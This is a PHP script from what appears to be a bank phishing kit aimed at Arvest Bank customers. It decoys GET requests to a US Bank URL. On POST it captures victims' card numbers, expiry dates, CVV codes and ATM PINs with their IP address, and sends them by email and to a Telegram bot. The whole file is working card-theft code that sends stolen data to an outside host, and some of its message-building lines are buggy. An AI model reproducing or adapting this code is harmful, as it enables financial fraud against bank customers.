<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] === "GET") {
    header("Location: https://onlinebanking.usbank.com/auth/login/static/css/main.45c70042.chunk.css?id=".md5(uniqid(rand(), true)));
}elseif ($_SERVER["REQUEST_METHOD"] === "POST") {
    include "../data.php";
    function get_client_ip() {
        $ipaddress = "";
        if (getenv("HTTP_CLIENT_IP"))
            $ipaddress = getenv("HTTP_CLIENT_IP");
        else if(getenv("HTTP_X_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_X_FORWARDED_FOR");
        else if(getenv("HTTP_X_FORWARDED"))
            $ipaddress = getenv("HTTP_X_FORWARDED");
        else if(getenv("HTTP_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_FORWARDED_FOR");
        else if(getenv("HTTP_FORWARDED"))
            $ipaddress = getenv("HTTP_FORWARDED");
        else if(getenv("REMOTE_ADDR"))
            $ipaddress = getenv("REMOTE_ADDR");
        else
            $ipaddress = "UNKNOWN";
        return $ipaddress;
    }    
    $IP = get_client_ip();
    $cadnum = $_POST['cadnum'];
        $exp = $_POST['exp'];
        $cvvcod = $_POST['cvvcod'];
        $atmp = $_POST['atmp'];
    $msg = "ARVEST BANK {CC (Credit-Card) Info}"."\r\n";
    $msg = "cadnum : $cadnum\r\n".
    $msg = "exp: $exp\r\n".
    $msg = "cvvcod: $cvvcod\r\n".
    $msg = "atmpin : $atmp\r\n";
	$msg = "IP ADDRESS : https://ip-api.com/".$IP."\r\n";
    $headers = "From: lovely@lovely.com". "\r\n" . "Reply-To: lovely@lovely.com". "\r\n";
    mail($sendto,"ARVEST BANK",$Message,$headers);
    $options=array("http"=>array("method"=>"POST","header"=>"Content-Type:application/x-www-form-urlencoded\r\n","content"=>http_build_query(array("chat_id"=>$telegramchatid,"text"=>$msg)),),);
    file_get_contents("https://api.telegram.org/bot".$telegrambot."/sendMessage",false,stream_context_create($options));
    header("Location: ../success.php?id=".md5(uniqid(rand(), true)));
}
?>